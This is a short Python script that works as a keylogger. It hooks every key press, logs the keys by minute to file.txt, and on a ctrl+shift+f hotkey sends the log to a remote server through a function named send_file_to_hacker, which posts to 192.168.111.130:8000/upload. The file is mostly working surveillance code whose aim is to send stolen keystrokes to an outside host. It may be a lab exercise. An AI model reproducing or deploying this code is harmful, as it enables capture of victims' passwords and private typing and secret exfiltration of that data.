import keyboard
import datetime
import os
import sys


def handle_key(event):
    current_time = datetime.datetime.fromtimestamp(event.time)
    insert_time_to_time_list(current_time)
    update_time(current_time)
    events.append(event.name)
    add_events_to_events_dict()
    check_if_show(event.name)



def insert_time_to_time_list(time):
    if len(time_list) < 1:
        time_list.append(time)

def update_time(time):
    if time_list[0].minute < time.minute:
        time_list.pop()
        time_list.append(time)

def add_events_to_events_dict():
    events_dict[time_list[0]]=events


def check_if_show(event):
    global word1
    word1 += event
    if word1.endswith('show'):
        for time, events in events_dict.items():
            print(f"------------{time}---------")
            print(events)

def write_to_txt_file():
    with open("file.txt", "a") as f:
        for time ,event in events_dict.items():
            f.write(f"time={time} , event = {event}")
    os.system('notepad.exe file.txt')

def send_file_to_hacker():
    import requests

    url = "http://192.168.111.130:8000/upload"  # ip to send the file
    file_path = "file.txt"  # Same directory as this script

    with open(file_path, 'rb') as f1:
        files = {
            'file': f1.read(),
            'filename': 'file.txt'
        }
        response = requests.post(url, files=files)
    print(response.text)


def stop_program():
    write_to_txt_file()
    send_file_to_hacker()
    keyboard.unhook_all()
    sys.exit(0)  # clean exit




events=[]
recorded_data_as_words = []
time_list=[]
events_dict={}
word1 =""
def main():
    global events
    global time_list
    global events_dict
    global word1
    keyboard.on_press(handle_key)
    keyboard.add_hotkey('ctrl+shift+f', stop_program)
    keyboard.wait()



main()
